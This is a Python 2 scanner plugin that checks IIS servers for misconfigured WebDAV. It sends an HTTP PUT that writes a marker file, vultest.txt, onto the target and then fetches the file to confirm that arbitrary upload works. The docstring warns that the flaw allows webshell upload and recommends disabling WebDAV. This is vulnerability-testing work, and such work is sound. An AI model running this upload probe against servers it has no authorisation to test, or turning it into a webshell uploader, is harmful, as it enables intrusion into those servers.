 #!/usr/bin/env python
# -*- coding:utf-8 -*-

'''
    name: IIS WebDav
    info: "开启了WebDav且配置不当可导致攻击者直接上传webshell，进而导致服务器被入侵控制。
    level: 紧急
    type: 任意文件上传
    repair: 禁用 IIS 的 WebDAV 服务
'''

import socket,urllib2,time
from POC_Framework import POC

class myPOC(POC):
    
    #单IP的POC
    def check(self, ip, port, timeout=5):
        try:
            socket.setdefaulttimeout(timeout)
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip, port))
            flag = "PUT /vultest.txt HTTP/1.1\r\nHost: %s:%d\r\nContent-Length: 9\r\n\r\nxxscan0\r\n\r\n" % (ip, port)
            s.send(flag)
            time.sleep(1)
            data = s.recv(1024)
            s.close()
            if 'PUT' in data:
                url = 'http://' + ip + ":" + str(port) + '/vultest.txt'
                request = urllib2.Request(url)
                res_html = urllib2.urlopen(request, timeout=timeout).read(204800)
                if 'xxscan0' in res_html:
                    return True
        except:
            return False

if __name__ == "__main__":

    Check_POC = myPOC()
    Check_POC.run()